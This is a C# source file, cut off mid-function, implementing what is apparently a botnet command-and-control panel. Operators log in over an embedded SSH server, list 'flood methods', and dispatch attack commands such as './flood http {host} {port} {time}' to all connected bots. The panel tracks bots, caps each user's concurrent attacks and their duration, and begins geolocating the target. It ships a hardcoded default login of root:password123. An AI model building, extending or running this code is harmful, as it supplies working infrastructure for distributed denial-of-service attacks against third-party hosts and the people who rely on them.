using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading;
using System.Threading.Tasks;
using FxSsh;
using FxSsh.Services;

namespace Agent
{
    public class UserConfig
    {
        [JsonPropertyName("username")]
        public string Username { get; set; } = string.Empty;

        [JsonPropertyName("password")]
        public string Password { get; set; } = string.Empty;

        [JsonPropertyName("concurrentLimit")]
        public int ConcurrentLimit { get; set; } = 1;

        [JsonPropertyName("timeLimit")]
        public int TimeLimit { get; set; } = 300;
    }

    public class MethodConfig
    {
        [JsonPropertyName("name")]
        public string Name { get; set; } = string.Empty;

        [JsonPropertyName("cmd")]
        public string Cmd { get; set; } = string.Empty;
    }

    public class LineEditorState
    {
        public StringBuilder Buffer { get; } = new();
        public int CursorPos { get; set; } = 0;
        public List<string> History { get; } = new();
        public int HistoryIndex { get; set; } = -1;
        public string SavedCurrentInput { get; set; } = string.Empty;
        public List<byte> EscapeSeq { get; } = new();
        public bool InEscape { get; set; } = false;
    }

    internal class Program
    {
        private static int _port = 1337;
        private static int _internalSshPort = 0;
        private static int _botCount = 0;
        private static List<UserConfig> _users = new();
        private static List<MethodConfig> _methods = new();
        private static readonly ConcurrentDictionary<Channel, LineEditorState> _sessionStates = new();
        private static readonly ConcurrentDictionary<Channel, string> _channelUsers = new();
        private static readonly ConcurrentDictionary<TcpClient, NetworkStream> _botStreams = new();
        private static readonly ConcurrentDictionary<TcpClient, bool> _activeProxyClients = new();
        private static readonly ConcurrentDictionary<string, int> _userActiveAttacks = new(StringComparer.OrdinalIgnoreCase);
        private static TcpListener? _mainListener;

        // ── Hot-reload watchers ───────────────────────────────────────────
        private static FileSystemWatcher? _configWatcher;
        private static Timer? _usersDebounce;
        private static Timer? _methodsDebounce;
        private static readonly object _reloadLock = new();

        private static string GetTitleSequence() => $"\x1b]0;Connected {_botCount}\x07";

        static void Main(string[] args)
        {
            ParseArguments(args);
            LoadUsers();
            LoadMethods();
            StartConfigWatcher();

            // Bind internal SSH server to loopback on random free port
            var sshListener = new TcpListener(IPAddress.Loopback, 0);
            sshListener.Start();
            _internalSshPort = ((IPEndPoint)sshListener.LocalEndpoint).Port;
            sshListener.Stop();

            var startingInfo = new StartingInfo(IPAddress.Loopback, _internalSshPort, "SSH-2.0-AgentSSH");
            var server = new SshServer(startingInfo);

            string rsaKey = GetOrGenerateKey("hostkey_rsa.pem", () => KeyGenerator.GenerateRsaKeyPem(2048));
            server.AddHostKey("ssh-rsa", rsaKey);
            server.AddHostKey("rsa-sha2-256", rsaKey);
            server.AddHostKey("rsa-sha2-512", rsaKey);

            string ecdsaKey = GetOrGenerateKey("hostkey_ecdsa.pem", () => KeyGenerator.GenerateECDsaKeyPem("nistp256"));
            server.AddHostKey("ecdsa-sha2-nistp256", ecdsaKey);

            server.ConnectionAccepted += (sender, session) =>
            {
                try
                {
                    // Disable FxSsh default 30s session timeout and activate 5s SSH keep-alive
                    session.ConfigureKeepalive(TimeSpan.FromSeconds(5));

                    var timeoutField = typeof(Session).GetField("_timeout", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance);
                    timeoutField?.SetValue(session, TimeSpan.FromDays(365));
                }
                catch { }

                session.ServiceRegistered += (s, service) =>
                {
                    if (service is UserAuthService auth)
                    {
                        auth.UserAuth += (s2, authArgs) =>
                        {
                            if (authArgs.AuthMethod == "password")
                            {
                                var matched = _users.Exists(u =>
                                    string.Equals(u.Username, authArgs.Username, StringComparison.OrdinalIgnoreCase) &&
                                    (string.IsNullOrEmpty(u.Password) || u.Password == authArgs.Password));

                                if (matched)
                                {
                                    authArgs.Result = true;
                                    Console.WriteLine($"[+] Authenticated SSH user: {authArgs.Username}");
                                }
                                else
                                {
                                    authArgs.Result = false;
                                    Console.WriteLine($"[-] Failed SSH password authentication for user: {authArgs.Username}");
                                }
                            }
                            else if (authArgs.AuthMethod == "none")
                            {
                                var matched = _users.Exists(u =>
                                    string.Equals(u.Username, authArgs.Username, StringComparison.OrdinalIgnoreCase) &&
                                    string.IsNullOrEmpty(u.Password));

                                authArgs.Result = matched;
                            }
                            else
                            {
                                authArgs.Result = false;
                            }
                        };
                    }
                    else if (service is ConnectionService conn)
                    {
                        conn.CommandOpened += (s2, cmdArgs) =>
                        {
                            cmdArgs.Agreed = true;
                            var channel = cmdArgs.Channel;
                            string username = cmdArgs.AttachedUserAuthArgs?.Username ?? "root";
                            _channelUsers[channel] = username;
                            _sessionStates[channel] = new LineEditorState();

                            channel.DataReceived += (s3, dataMem) =>
                            {
                                HandleSessionData(channel, dataMem.ToArray());
                            };

                            channel.CloseReceived += (s3, e) =>
                            {
                                _sessionStates.TryRemove(channel, out _);
                                _channelUsers.TryRemove(channel, out _);
                            };

                            string prompt = $"\x1b[2J\x1b[3J\x1b[H{GetTitleSequence()}[\x1b[94m{username}\x1b[0m@\x1b[94maihui\x1b[0m] ";
                            channel.SendData(Encoding.UTF8.GetBytes(prompt));
                        };

                        conn.PtyReceived += (s2, ptyArgs) =>
                        {
                        };

                        conn.EnvReceived += (s2, envArgs) =>
                        {
                        };
                    }
                };
            };

            server.Start();

            // Start Unified Port Listener (SSH & Bot Multiplexer on single port)
            var mainListenerThread = new Thread(() => StartMultiplexListener(_port)) { IsBackground = true };
            mainListenerThread.Start();

            Console.WriteLine($"[+] Single Port Multiplexer active on port {_port} (SSH & Bot unified)");
            Console.WriteLine("[+] Press Ctrl+C to stop.");

            var waitHandle = new ManualResetEvent(false);
            Console.CancelKeyPress += (s, e) =>
            {
                e.Cancel = true;
                _mainListener?.Stop();
                server.Stop();
                waitHandle.Set();
            };
            waitHandle.WaitOne();
        }

        private static void StartMultiplexListener(int port)
        {
            try
            {
                _mainListener = new TcpListener(IPAddress.Any, port);
                _mainListener.Start();

                while (true)
                {
                    var client = _mainListener.AcceptTcpClient();
                    var th = new Thread(() => RouteIncomingConnection(client)) { IsBackground = true };
                    th.Start();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Main multiplexer listener stopped: {ex.Message}");
            }
        }

        private static void RouteIncomingConnection(TcpClient client)
        {
            try
            {
                var socket = client.Client;
                socket.ReceiveTimeout = 10000;
                var buffer = new byte[256];

                // Read client first message
                int received = socket.Receive(buffer, 0, buffer.Length, SocketFlags.None);
                socket.ReceiveTimeout = 0;

                if (received <= 0)
                {
                    client.Close();
                    return;
                }

                if (received >= 4 &&
                    buffer[0] == (byte)'S' &&
                    buffer[1] == (byte)'S' &&
                    buffer[2] == (byte)'H' &&
                    buffer[3] == (byte)'-')
                {
                    // Client is SSH
                    ProxyToInternalSsh(client, buffer, received);
                }
                else
                {
                    // Client is Bot
                    var stream = client.GetStream();
                    HandleBotClient(client, stream, buffer, received);
                }
            }
            catch
            {
                try { client.Close(); } catch { }
            }
        }

        private static void ProxyToInternalSsh(TcpClient externalClient, byte[] prefixData, int prefixLen)
        {
            TcpClient? internalClient = null;
            try
            {
                externalClient.NoDelay = true;
                externalClient.ReceiveTimeout = 0;
                externalClient.SendTimeout = 0;
                externalClient.Client.ReceiveTimeout = 0;
                externalClient.Client.SendTimeout = 0;
                externalClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);

                internalClient = new TcpClient();
                internalClient.NoDelay = true;
                internalClient.ReceiveTimeout = 0;
                internalClient.SendTimeout = 0;
                internalClient.Connect(IPAddress.Loopback, _internalSshPort);

                _activeProxyClients[externalClient] = true;
                _activeProxyClients[internalClient] = true;

                var extStream = externalClient.GetStream();
                var intStream = internalClient.GetStream();

                // Forward the SSH banner that was already read from external client to internal SSH server
                intStream.Write(prefixData, 0, prefixLen);

                using var cts = new CancellationTokenSource();

                var t1 = Task.Run(() =>
                {
                    byte[] buf = new byte[8192];
                    try
                    {
                        while (externalClient.Connected && internalClient.Connected)
                        {
                            int read = extStream.Read(buf, 0, buf.Length);
                            if (read <= 0) break;
                            intStream.Write(buf, 0, read);
                            intStream.Flush();
                        }
                    }
                    catch { }
                    finally
                    {
                        try { cts.Cancel(); } catch { }
                    }
                });

                var t2 = Task.Run(() =>
                {
                    byte[] buf = new byte[8192];
                    try
                    {
                        while (externalClient.Connected && internalClient.Connected)
                        {
                            int read = intStream.Read(buf, 0, buf.Length);
                            if (read <= 0) break;
                            extStream.Write(buf, 0, read);
                            extStream.Flush();
                        }
                    }
                    catch { }
                    finally
                    {
                        try { cts.Cancel(); } catch { }
                    }
                });

                // Wait until one side explicitly disconnects (e.g. user types exit or closes client)
                while (!cts.Token.IsCancellationRequested && externalClient.Connected && internalClient.Connected)
                {
                    Thread.Sleep(100);
                }
            }
            catch
            {
            }
            finally
            {
                _activeProxyClients.TryRemove(externalClient, out _);
                if (internalClient != null) _activeProxyClients.TryRemove(internalClient, out _);
                try { externalClient.Close(); } catch { }
                try { internalClient?.Close(); } catch { }
            }
        }

        private static void HandleBotClient(TcpClient client, NetworkStream stream, byte[] initialData, int initialLen)
        {
            Interlocked.Increment(ref _botCount);
            UpdateConnectedTitle();
            string botId = "unknown";

            try
            {
                _botStreams[client] = stream;
                stream.ReadTimeout = 45000;

                // Process the initial data already read during routing
                string firstMsg = Encoding.UTF8.GetString(initialData, 0, initialLen).Trim();
                if (firstMsg.StartsWith("HELLO "))
                {
                    botId = firstMsg.Substring(6).Trim();
                    Console.WriteLine($"[+] Bot connected: {botId} (Total: {_botCount})");
                }

                var buffer = new byte[1024];
                while (client.Connected)
                {
                    int bytesRead = stream.Read(buffer, 0, buffer.Length);
                    if (bytesRead <= 0) break;

                    string msg = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                    if (msg.StartsWith("HELLO "))
                    {
                        botId = msg.Substring(6).Trim();
                        Console.WriteLine($"[+] Bot connected: {botId} (Total: {_botCount})");
                    }
                    else if (msg == "PING")
                    {
                        byte[] pong = Encoding.UTF8.GetBytes("PONG\n");
                        stream.Write(pong, 0, pong.Length);
                    }
                }
            }
            catch
            {
            }
            finally
            {
                _botStreams.TryRemove(client, out _);
                client.Close();
                Interlocked.Decrement(ref _botCount);
                UpdateConnectedTitle();
                Console.WriteLine($"[-] Bot disconnected: {botId} (Total: {_botCount})");
            }
        }

        private static void UpdateConnectedTitle()
        {
            string titleSeq = GetTitleSequence();
            byte[] titleBytes = Encoding.UTF8.GetBytes(titleSeq);
            foreach (var channel in _channelUsers.Keys)
            {
                try
                {
                    channel.SendData(titleBytes);
                }
                catch
                {
                }
            }
        }

        private static void ParseArguments(string[] args)
        {
            for (int i = 0; i < args.Length; i++)
            {
                if ((args[i] == "-p" || args[i] == "--port") && i + 1 < args.Length)
                {
                    if (int.TryParse(args[i + 1], out int p))
                    {
                        _port = p;
                        i++;
                    }
                }
            }
        }

        private static void StartConfigWatcher()
        {
            // Resolve the directory that actually contains the config files
            string usersPath   = ResolveConfigPath("users.json");
            string methodsPath = ResolveConfigPath("methods.json");
            string dir         = Path.GetDirectoryName(Path.GetFullPath(usersPath)) ?? ".";

            try
            {
                // Single watcher on the config directory, filter by json
                var watcher = new FileSystemWatcher(dir, "*.json")
                {
                    NotifyFilter         = NotifyFilters.LastWrite | NotifyFilters.Size | NotifyFilters.FileName,
                    IncludeSubdirectories = false,
                    EnableRaisingEvents  = true,
                };

                watcher.Changed += OnConfigFileEvent;
                watcher.Created += OnConfigFileEvent;
                watcher.Renamed += (s, e) => OnConfigFileEvent(s,
                    new FileSystemEventArgs(WatcherChangeTypes.Changed, dir, e.Name));

                _configWatcher = watcher; // keep reference alive
                Console.WriteLine($"[~] Config watcher active on: {dir}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Config watcher failed to start: {ex.Message}");
            }
        }

        private static void OnConfigFileEvent(object sender, FileSystemEventArgs e)
        {
            string name = Path.GetFileName(e.FullPath);

            if (string.Equals(name, "users.json", StringComparison.OrdinalIgnoreCase))
            {
                // Debounce 500 ms — editors may write in multiple flushes
                lock (_reloadLock)
                {
                    _usersDebounce?.Dispose();
                    _usersDebounce = new Timer(_ =>
                    {
                        LoadUsers();
                        NotifyAllSessions("[~] users.json reloaded");
                    }, null, 500, Timeout.Infinite);
                }
            }
            else if (string.Equals(name, "methods.json", StringComparison.OrdinalIgnoreCase))
            {
                lock (_reloadLock)
                {
                    _methodsDebounce?.Dispose();
                    _methodsDebounce = new Timer(_ =>
                    {
                        LoadMethods();
                        NotifyAllSessions("[~] methods.json reloaded");
                    }, null, 500, Timeout.Infinite);
                }
            }
        }

        private static void NotifyAllSessions(string message)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(
                $"\r\n  {CDim}──{C0}  {CWarn}{message}{C0}\r\n");
            foreach (var channel in _channelUsers.Keys)
            {
                try { channel.SendData(bytes); } catch { }
            }
        }

        private static string ResolveConfigPath(string filename)
        {
            string baseDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, filename);
            if (File.Exists(baseDir)) return baseDir;
            return filename; // fallback to cwd
        }

        private static void LoadUsers()
        {
            string path = ResolveConfigPath("users.json");

            if (File.Exists(path))
            {
                try
                {
                    string json = File.ReadAllText(path);
                    var loaded = JsonSerializer.Deserialize<List<UserConfig>>(json) ?? new List<UserConfig>();
                    Interlocked.Exchange(ref _users, loaded);
                    Console.WriteLine($"[+] Loaded {_users.Count} user(s) from users.json");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error parsing users.json: {ex.Message}");
                }
            }
            else
            {
                Console.WriteLine("[!] users.json not found, creating default user root:password123");
                _users = new List<UserConfig> { new UserConfig { Username = "root", Password = "password123" } };
                File.WriteAllText("users.json", JsonSerializer.Serialize(_users, new JsonSerializerOptions { WriteIndented = true }));
            }
        }

        private static void LoadMethods()
        {
            string path = ResolveConfigPath("methods.json");

            if (File.Exists(path))
            {
                try
                {
                    string json = File.ReadAllText(path);
                    var loaded = JsonSerializer.Deserialize<List<MethodConfig>>(json) ?? new List<MethodConfig>();
                    Interlocked.Exchange(ref _methods, loaded);
                    Console.WriteLine($"[+] Loaded {_methods.Count} method(s) from methods.json");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error parsing methods.json: {ex.Message}");
                }
            }
            else
            {
                Console.WriteLine("[!] methods.json not found, creating default method");
                _methods = new List<MethodConfig>
                {
                    new MethodConfig { Name = "http", Cmd = "./flood http {host} {port} {time}" }
                };
                File.WriteAllText("methods.json", JsonSerializer.Serialize(_methods, new JsonSerializerOptions { WriteIndented = true }));
            }
        }

        private static void HandleSessionData(Channel channel, byte[] data)
        {
            if (!_sessionStates.TryGetValue(channel, out var state))
            {
                state = new LineEditorState();
                _sessionStates[channel] = state;
            }

            _channelUsers.TryGetValue(channel, out var username);
            if (string.IsNullOrEmpty(username)) username = "root";

            for (int i = 0; i < data.Length; i++)
            {
                byte b = data[i];

                if (b == 0x1B) // ESC
                {
                    state.InEscape = true;
                    state.EscapeSeq.Clear();
                    state.EscapeSeq.Add(b);
                    continue;
                }

                if (state.InEscape)
                {
                    state.EscapeSeq.Add(b);

                    // If sequence starts with \x1b[
                    if (state.EscapeSeq.Count >= 2 && state.EscapeSeq[0] == 0x1B && state.EscapeSeq[1] == (byte)'[')
                    {
                        // Final characters for CSI are typically @ through ~ (0x40 - 0x7E)
                        if (state.EscapeSeq.Count >= 3 && b >= 0x40 && b <= 0x7E)
                        {
                            HandleEscapeSequence(channel, state, state.EscapeSeq);
                            state.InEscape = false;
                            state.EscapeSeq.Clear();
                        }
                    }
                    else if (state.EscapeSeq.Count >= 2 && state.EscapeSeq[0] == 0x1B && (state.EscapeSeq[1] == (byte)'O' || state.EscapeSeq[1] == (byte)'N'))
                    {
                        if (state.EscapeSeq.Count >= 3)
                        {
                            HandleEscapeSequence(channel, state, state.EscapeSeq);
                            state.InEscape = false;
                            state.EscapeSeq.Clear();
                        }
                    }
                    else if (state.EscapeSeq.Count > 10)
                    {
                        state.InEscape = false;
                        state.EscapeSeq.Clear();
                    }
                    continue;
                }

                if (b == '\r' || b == '\n')
                {
                    channel.SendData(Encoding.UTF8.GetBytes("\r\n"));

                    string command = state.Buffer.ToString().Trim();
                    if (!string.IsNullOrEmpty(command))
                    {
                        // Add to history (avoid consecutive duplicates)
                        if (state.History.Count == 0 || state.History[state.History.Count - 1] != command)
                        {
                            state.History.Add(command);
                        }
                    }

                    state.Buffer.Clear();
                    state.CursorPos = 0;
                    state.HistoryIndex = -1;
                    state.SavedCurrentInput = string.Empty;

                    if (!string.IsNullOrEmpty(command))
                    {
                        ProcessCommand(channel, command);
                    }

                    channel.SendData(Encoding.UTF8.GetBytes($"{GetTitleSequence()}[\x1b[94m{username}\x1b[0m@\x1b[94maihui\x1b[0m] "));
                }
                else if (b == 0x08 || b == 0x7F) // Backspace
                {
                    if (state.CursorPos > 0)
                    {
                        state.Buffer.Remove(state.CursorPos - 1, 1);
                        state.CursorPos--;

                        // Redraw from cursor pos to end of line, then move cursor back
                        string remaining = state.Buffer.ToString().Substring(state.CursorPos) + " ";
                        string backSequence = new string('\b', remaining.Length);
                        channel.SendData(Encoding.UTF8.GetBytes($"\b{remaining}{backSequence}"));
                        if (state.CursorPos < state.Buffer.Length)
                        {
                            int shift = state.Buffer.Length - state.CursorPos;
                            channel.SendData(Encoding.UTF8.GetBytes(new string('\b', shift)));
                        }
                    }
                }
                else if (b == 0x03) // Ctrl+C
                {
                    state.Buffer.Clear();
                    state.CursorPos = 0;
                    state.HistoryIndex = -1;
                    state.SavedCurrentInput = string.Empty;

                    channel.SendData(Encoding.UTF8.GetBytes("^C\r\n"));
                    channel.SendData(Encoding.UTF8.GetBytes($"{GetTitleSequence()}[\x1b[94m{username}\x1b[0m@\x1b[94maihui\x1b[0m] "));
                }
                else if (b >= 32 && b <= 126) // Printable characters
                {
                    char c = (char)b;
                    if (state.CursorPos == state.Buffer.Length)
                    {
                        state.Buffer.Append(c);
                        state.CursorPos++;
                        channel.SendData(new byte[] { b });
                    }
                    else
                    {
                        state.Buffer.Insert(state.CursorPos, c);
                        state.CursorPos++;
                        string tail = state.Buffer.ToString().Substring(state.CursorPos - 1);
                        int shift = state.Buffer.Length - state.CursorPos;
                        string moveBack = shift > 0 ? new string('\b', shift) : "";
                        channel.SendData(Encoding.UTF8.GetBytes(tail + moveBack));
                    }
                }
            }
        }

        private static void HandleEscapeSequence(Channel channel, LineEditorState state, List<byte> seq)
        {
            string s = Encoding.ASCII.GetString(seq.ToArray());

            if (s == "\x1b[A" || s == "\x1bOA" || s.EndsWith("A")) // UP Arrow
            {
                if (state.History.Count == 0) return;

                if (state.HistoryIndex == -1)
                {
                    state.SavedCurrentInput = state.Buffer.ToString();
                    state.HistoryIndex = state.History.Count - 1;
                }
                else if (state.HistoryIndex > 0)
                {
                    state.HistoryIndex--;
                }

                SetInputBuffer(channel, state, state.History[state.HistoryIndex]);
            }
            else if (s == "\x1b[B" || s == "\x1bOB" || s.EndsWith("B")) // DOWN Arrow
            {
                if (state.HistoryIndex == -1) return;

                if (state.HistoryIndex < state.History.Count - 1)
                {
                    state.HistoryIndex++;
                    SetInputBuffer(channel, state, state.History[state.HistoryIndex]);
                }
                else
                {
                    state.HistoryIndex = -1;
                    SetInputBuffer(channel, state, state.SavedCurrentInput);
                }
            }
            else if (s == "\x1b[C" || s == "\x1bOC" || s.EndsWith("C")) // RIGHT Arrow
            {
                if (state.CursorPos < state.Buffer.Length)
                {
                    state.CursorPos++;
                    channel.SendData(Encoding.ASCII.GetBytes("\x1b[C"));
                }
            }
            else if (s == "\x1b[D" || s == "\x1bOD" || s.EndsWith("D")) // LEFT Arrow
            {
                if (state.CursorPos > 0)
                {
                    state.CursorPos--;
                    channel.SendData(Encoding.ASCII.GetBytes("\x1b[D"));
                }
            }
            else if (s == "\x1b[H" || s == "\x1b[1~" || s == "\x1b[7~") // HOME Key
            {
                if (state.CursorPos > 0)
                {
                    channel.SendData(Encoding.ASCII.GetBytes($"\x1b[{state.CursorPos}D"));
                    state.CursorPos = 0;
                }
            }
            else if (s == "\x1b[F" || s == "\x1b[4~" || s == "\x1b[8~") // END Key
            {
                int diff = state.Buffer.Length - state.CursorPos;
                if (diff > 0)
                {
                    channel.SendData(Encoding.ASCII.GetBytes($"\x1b[{diff}C"));
                    state.CursorPos = state.Buffer.Length;
                }
            }
            else if (s == "\x1b[3~") // DELETE Key
            {
                if (state.CursorPos < state.Buffer.Length)
                {
                    state.Buffer.Remove(state.CursorPos, 1);
                    string tail = state.Buffer.ToString().Substring(state.CursorPos) + " ";
                    int shift = state.Buffer.Length - state.CursorPos + 1;
                    string moveBack = new string('\b', shift);
                    channel.SendData(Encoding.UTF8.GetBytes(tail + moveBack));
                }
            }
        }

        private static void SetInputBuffer(Channel channel, LineEditorState state, string newText)
        {
            // Move cursor to start of buffer
            if (state.CursorPos > 0)
            {
                channel.SendData(Encoding.ASCII.GetBytes($"\x1b[{state.CursorPos}D"));
            }

            // Clear to end of line
            channel.SendData(Encoding.ASCII.GetBytes("\x1b[K"));

            // Replace buffer
            state.Buffer.Clear();
            state.Buffer.Append(newText);
            state.CursorPos = newText.Length;

            // Render new text
            channel.SendData(Encoding.UTF8.GetBytes(newText));
        }

        // ── ANSI color constants ──────────────────────────────────────────
        private const string C0  = "\x1b[0m";           // reset
        private const string CDim   = "\x1b[38;5;240m"; // separator / dim label
        private const string CKey   = "\x1b[38;5;246m"; // field key
        private const string CVal   = "\x1b[97m";       // value (white)
        private const string CNum   = "\x1b[38;5;222m"; // numbers / port / time
        private const string CCmd   = "\x1b[38;5;75m";  // command / method name
        private const string CDesc  = "\x1b[38;5;245m"; // description text
        private const string CGood  = "\x1b[38;5;114m"; // success / swarm count
        private const string CWarn  = "\x1b[38;5;215m"; // warning
        private const string CErr   = "\x1b[38;5;203m"; // error
        private const string CHead  = "\x1b[1;97m";     // section header (bold white)
        private const string CIP    = "\x1b[38;5;81m";  // IP address
        private const string CUrl   = "\x1b[38;5;75m";  // url / host

        private static string Ln(string s = "") => s + "\r\n";
        private static string Send(StringBuilder sb) =>
            sb.ToString().Replace("\n", "\r\n").Replace("\r\r\n", "\r\n");

        private static void ProcessCommand(Channel channel, string command)
        {
            var parts = command.Split(' ', StringSplitOptions.RemoveEmptyEntries);
            if (parts.Length == 0) return;

            string cmdName = parts[0];

            if (cmdName.Equals("help", StringComparison.OrdinalIgnoreCase))
            {
                var sb = new StringBuilder();
                sb.Append(Ln());
                sb.Append(Ln($"  {CHead}COMMANDS{C0}"));
                sb.Append(Ln($"  {CDim}{'─'.ToString().PadRight(46, '─')}{C0}"));
                sb.Append(Ln($"  {CCmd}{"help",-12}{C0}  {CDim}│{C0}  {CDesc}Show this help message{C0}"));
                sb.Append(Ln($"  {CCmd}{"methods",-12}{C0}  {CDim}│{C0}  {CDesc}List all available flood methods{C0}"));
                sb.Append(Ln($"  {CCmd}{"bots",-12}{C0}  {CDim}│{C0}  {CDesc}Show connected bot count{C0}"));
                sb.Append(Ln($"  {CCmd}{"clear / cls",-12}{C0}  {CDim}│{C0}  {CDesc}Clear the terminal screen{C0}"));
                sb.Append(Ln($"  {CCmd}{"exit / quit",-12}{C0}  {CDim}│{C0}  {CDesc}Close this session{C0}"));
                sb.Append(Ln($"  {CDim}{'─'.ToString().PadRight(46, '─')}{C0}"));
                sb.Append(Ln());
                channel.SendData(Encoding.UTF8.GetBytes(Send(sb)));
            }
            else if (cmdName.Equals("methods", StringComparison.OrdinalIgnoreCase))
            {
                channel.SendData(Encoding.UTF8.GetBytes(GetFormattedMethodsMenu()));
            }
            else if (cmdName.Equals("bots", StringComparison.OrdinalIgnoreCase))
            {
                channel.SendData(Encoding.UTF8.GetBytes(
                    Ln($"  {CKey}bots{C0}  {CDim}│{C0}  {CGood}{_botCount} connected{C0}")));
            }
            else if (cmdName.Equals("clear", StringComparison.OrdinalIgnoreCase) || cmdName.Equals("cls", StringComparison.OrdinalIgnoreCase))
            {
                channel.SendData(Encoding.ASCII.GetBytes("\x1b[2J\x1b[3J\x1b[H"));
            }
            else if (cmdName.Equals("exit", StringComparison.OrdinalIgnoreCase) || cmdName.Equals("quit", StringComparison.OrdinalIgnoreCase))
            {
                channel.SendData(Encoding.UTF8.GetBytes(Ln($"  {CDesc}session closed{C0}")));
                channel.SendClose();
            }
            else
            {
                string cleanCmd = cmdName.StartsWith(".") ? cmdName.Substring(1) : cmdName;
                var method = _methods.Find(m => string.Equals(m.Name, cleanCmd, StringComparison.OrdinalIgnoreCase) || string.Equals(m.Name, cmdName, StringComparison.OrdinalIgnoreCase));
                if (method != null)
                {
                    var placeholders = ExtractPlaceholders(method.Cmd);
                    var args = new string[parts.Length - 1];
                    Array.Copy(parts, 1, args, 0, parts.Length - 1);

                    bool hasPortInTemplate = placeholders.Contains("{port}");
                    string targetHost = "N/A";
                    string targetPort = "N/A";
                    string attackDuration = "N/A";
                    string formattedCmd = method.Cmd;

                    if (hasPortInTemplate)
                    {
                        if (args.Length < 3)
                        {
                            channel.SendData(Encoding.UTF8.GetBytes(
                                Ln($"  {CErr}error{C0}  {CDim}│{C0}  {CDesc}usage: {CCmd}.{method.Name} {CVal}<host> <port> <time>{C0}")));
                            return;
                        }
                        targetHost = args[0];
                        targetPort = args[1];
                        attackDuration = args[2];
                        formattedCmd = formattedCmd.Replace("{host}", targetHost)
                                                   .Replace("{port}", targetPort)
                                                   .Replace("{time}", attackDuration);
                    }
                    else
                    {
                        // L7 or method template without port (e.g. ./tls {host} {time} 100) -> Usage: .method <url> <time>
                        if (args.Length < 2)
                        {
                            channel.SendData(Encoding.UTF8.GetBytes(
                                Ln($"  {CErr}error{C0}  {CDim}│{C0}  {CDesc}usage: {CCmd}.{method.Name} {CVal}<url> <time>{C0}")));
                            return;
                        }

                        targetHost = args[0];
                        attackDuration = args.Length >= 3 ? args[2] : args[1];
                        targetPort = "N/A";

                        formattedCmd = formattedCmd.Replace("{host}", targetHost)
                                                   .Replace("{time}", attackDuration);
                    }

                    // --- Per-user limit enforcement ---
                    _channelUsers.TryGetValue(channel, out var attackingUser);
                    if (string.IsNullOrEmpty(attackingUser)) attackingUser = "root";

                    var userCfg = _users.Find(u => string.Equals(u.Username, attackingUser, StringComparison.OrdinalIgnoreCase));
                    int concurrentLimit = userCfg?.ConcurrentLimit ?? 1;
                    int timeLimit = userCfg?.TimeLimit ?? 300;

                    // Check concurrent attack limit
                    int currentActive = _userActiveAttacks.GetOrAdd(attackingUser, 0);
                    if (currentActive >= concurrentLimit)
                    {
                        channel.SendData(Encoding.UTF8.GetBytes(
                            Ln($"  {CErr}limit{C0}  {CDim}│{C0}  {CDesc}concurrent attack limit reached {CNum}({concurrentLimit}){C0}")));
                        return;
                    }

                    // Enforce time limit
                    if (int.TryParse(attackDuration, out int parsedTime) && parsedTime > timeLimit)
                    {
                        channel.SendData(Encoding.UTF8.GetBytes(
                            Ln($"  {CWarn}warn{C0}   {CDim}│{C0}  {CDesc}time clamped {CNum}{parsedTime}s {CDim}→ {CNum}{timeLimit}s{C0}")));
                        attackDuration = timeLimit.ToString();
                        // Rebuild formattedCmd with clamped time
                        formattedCmd = method.Cmd;
                        if (hasPortInTemplate)
                        {
                            formattedCmd = formattedCmd.Replace("{host}", targetHost)
                                                       .Replace("{port}", targetPort)
                                                       .Replace("{time}", attackDuration);
                        }
                        else
                        {
                            formattedCmd = formattedCmd.Replace("{host}", targetHost)
                                                       .Replace("{time}", attackDuration);
                        }
                    }

                    // Increment active attack counter and schedule decrement after duration
                    _userActiveAttacks.AddOrUpdate(attackingUser, 1, (k, v) => v + 1);
                    if (int.TryParse(attackDuration, out int durationSecs) && durationSecs > 0)
                    {
                        string capturedUser = attackingUser;
                        var _ = Task.Run(async () =>
                        {
                            await Task.Delay(TimeSpan.FromSeconds(durationSecs + 2));
                            _userActiveAttacks.AddOrUpdate(capturedUser, 0, (k, v) => Math.Max(0, v - 1));
                        });
                    }
                    else
                    {
                        // Fallback: decrement immediately if duration is unknown
                        _userActiveAttacks.AddOrUpdate(attackingUser, 0, (k, v) => Math.Max(0, v - 1));
                    }
                    // --- End limit enforcement ---

                    int dispatched = BroadcastToBots(formattedCmd);

                    string response = FormatDispatchResponse(method.Name, targetHost, targetPort, attackDuration, dispatched);
                    channel.SendData(Encoding.UTF8.GetBytes(response));
                }
                else
                {
                    channel.SendData(Encoding.UTF8.GetBytes(
                        Ln($"  {CErr}error{C0}  {CDim}│{C0}  {CDesc}unknown command {CCmd}{cmdName}{CDesc} — type {CCmd}help{C0}")));
                }
            }
        }

        private static readonly HttpClient _httpClient = new() { Timeout = TimeSpan.FromSeconds(3) };

        private class TargetGeoInfo
        {
            public string ResolvedIp { get; set; } = "N/A";
            public string Isp { get; set; } = "Unknown ISP";
            public string Region { get; set; } = "Unknown Region";
            public string Country { get; set; } = "Unknown Country";
            public string Asn { get; set; } = "Unknown ASN";
        }

        private static TargetGeoInfo ResolveTargetGeo(string rawHost)
        {
            var info = new TargetGeoInfo();
            try
            {
                string host = rawHost.Trim();
                if (host.StartsWith("http://", StringComparison.OrdinalIgnoreCase) || host.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                {
                    if (Uri.TryCreate(host, UriKind.Absolute, out var uri))
                    {
                        host = uri.Host;
                    }
                }

                if (IPAddress.TryParse(host, out var ip))
                {
                    info.ResolvedIp = ip.ToString();
                }
                else
                {
                    var addresses = Dns.GetHostAddresses(host);
                    if (addresses.Length > 0)
                    {
                        info.ResolvedIp = addresses[0].ToString();
                    }
                    else
                    {
                        info.ResolvedIp = host;
                    }
                }

                // Query ip-api for ISP / Region / ASN details
                if (info.ResolvedIp != "N/A")
                {
                    string url = $"http://ip-api.com/json/{info.ResolvedIp}?fields=status,country,regionName,isp,as";
